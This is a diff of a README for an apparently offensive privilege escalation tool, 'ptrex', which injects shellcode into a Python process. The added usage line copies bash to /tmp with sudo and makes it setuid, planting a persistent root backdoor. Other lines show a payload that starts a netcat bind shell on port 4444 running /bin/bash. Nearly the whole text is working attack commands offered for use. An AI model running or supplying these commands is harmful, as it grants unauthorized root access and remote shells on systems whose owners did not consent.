@@ -19,14 +19,13 @@ gcc -o xpk xpk.c
 ```
 
 ## ptrex.c:
-Local Privilege Escalation via shellcode injection execve + python -c. 
-
+Local Privilege Escalation via shellcode injection execve + python -c import os; os.system("echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1"); import pty; pty.spawn("/bin/bash");
 ```
 gcc -o ptrex ptrex.c
- ./ptrex /home/dreg/tmp/python 'import os; os.system("/usr/bin/sudo /bin/nc -lvp 4444 -e /bin/bash")'
+ ./ptrex 
 ```
 
-You can also inject your own python code:
+You can also inject your own python code: ./ptrex full_python_path newcmdline
 ```
 ./ptrex /home/dreg/tmp/python 'import os; os.system("/usr/bin/sudo /bin/nc -lvp 4444 -e /bin/bash")'
 ```
